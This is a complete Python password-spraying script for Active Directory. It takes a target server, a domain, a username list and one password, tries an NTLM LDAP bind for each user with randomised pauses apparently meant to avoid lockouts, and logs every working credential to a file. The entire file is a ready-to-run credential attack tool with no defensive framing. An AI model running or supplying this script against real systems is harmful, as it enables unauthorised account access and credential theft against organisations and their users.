#!/usr/bin/python
import sys, requests, random, time
from ldap3 import Server, Connection, ALL, NTLM


MIN = 5     # 0.5
MAX = 15    # 1.5


def check_creds(host, username, password, domain):
    has_access = False
    username = '%s\\%s' % (domain, username)
    try:
        server = Server(host, get_info=ALL)
        conn = Connection(server, user=username, password=password, authentication=NTLM, auto_bind=True)
        conn.extend.standard.who_am_i()
        has_access = True
    except:
        has_access = False
    return has_access



if __name__ == '__main__':
    try:
        target_server = sys.argv[1]
        domain_name = sys.argv[2]
        username_list = sys.argv[3]
        password = sys.argv[4]

        with open("spray_results.txt", "w") as log_file:
            starting = "[+] spraying server: %s domain: %s\n" % (target_server, domain_name)
            log_file.write(starting)
            print(starting)
            for username in open(username_list, "rb").readlines():
                print("[*] trying %s\\%s:%s\n" % (domain_name, username.strip(), password))
                if check_creds(target_server, username.strip(), password, domain_name):
                    success = "[+][+][+] success %s\\%s:%s\n" % (domain_name, username.strip(), password)
                    log_file.write(success)
                    print(success)
                else:
                    failure = "[-] failed %s\\%s:%s\n" % (domain_name, username.strip(), password)
                    log_file.write(failure)
                    print(failure)
                print("[.] sleeping")
                time.sleep(random.randrange(MIN, MAX) * 0.1)

    except Exception as error:
        print("[+] usage: %s <target server> <domain> <username list> <password>" % sys.argv[0])
